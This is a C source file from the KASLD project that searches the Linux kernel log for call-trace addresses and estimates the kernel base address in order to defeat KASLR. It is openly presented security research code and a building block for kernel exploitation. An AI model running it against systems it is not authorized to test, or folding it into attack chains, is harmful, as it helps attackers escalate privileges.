// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for call traces and return the lowest address
// that looks like a kernel pointer.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities.
// - kernel.panic_on_oops = 0 (Default on most systems).
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned long search_dmesg_kernel_pointers() {
  char *syslog;
  char *ptr;
  char *endptr;
  int size;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;

  printf("[.] searching dmesg for call trace kernel pointers ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  ptr = strtok(syslog, "[<");
  while ((ptr = strtok(NULL, "[<")) != NULL) {
    leaked_addr = strtoul(&ptr[0], &endptr, 16);

    if (!leaked_addr)
      continue;

    if (leaked_addr >= KERNEL_BASE_MIN && leaked_addr <= KERNEL_BASE_MAX) {
      //printf("Found kernel pointer: %lx\n", leaked_addr);
      if (!addr || leaked_addr < addr)
        addr = leaked_addr;
    }
  }

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = search_dmesg_kernel_pointers();
  if (!addr)
    return 1;

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
